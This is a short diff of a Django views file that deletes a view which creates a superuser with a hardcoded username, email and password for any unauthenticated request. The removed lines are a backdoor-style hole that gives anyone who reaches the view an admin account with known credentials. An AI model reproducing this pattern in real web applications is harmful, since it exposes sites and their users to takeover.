@@ -85,7 +85,3 @@ def my_profile(request):
     }
     return render(request, 'users/my_profile.html', context)
 
-
-def make_admin_view(request):
-    User.objects.create_superuser(username='admin', email='angelinvestor@coffeehouse.com', password='people666')
-    return HttpResponseRedirect(reverse_lazy('imageapp:index'))
